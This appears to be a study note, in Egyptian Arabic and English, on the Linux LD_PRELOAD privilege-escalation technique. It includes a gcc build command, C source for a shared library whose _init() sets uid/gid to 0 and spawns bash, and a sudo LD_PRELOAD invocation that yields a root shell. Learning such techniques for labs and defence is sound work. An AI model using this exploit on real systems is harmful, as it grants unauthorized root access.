# LD\_PRELOAD

الفايل دا بيسمحلك انك تضيف كود في مكتبه معينه وبيستدعي كودك قبل كود المكتبه الاساسيه

![image.png](<../../../.gitbook/assets/image (18).png>)

This command tells GCC to **compile a C source file (`malicious.c`) into a shared object file (`malicious.so`)**. Shared object files (`.so`) are dynamic libraries used by other programs — they don’t run by themselves.

It’s often used for:

* Creating **custom shared libraries**.
* Building **malicious payloads** for tricks like `LD_PRELOAD`.

```bash
gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles

# fPIC -> allow this file can be execute on any loction of ram
-nostartfiles: معناه "ما تحطليش ملفات البداية الافتراضية" (زي اللي بتحتوي على main() أو تهيئة البيئة)، وده لأن الملف مش هيتنفذ لوحده، هو مجرد مكتبة هتشتغل من خلال برنامج تاني.

```

```c
// this a malicious file
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

![2025-04-08 20\_03\_52-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 04 08_20_03_52 Kali_Linux_ _VMware_Workstation.png>)

```bash
sudo LD_PRELOAD=/home/user/malicious.so apache2
#and u can use it with any service dosen't need privilege user
```
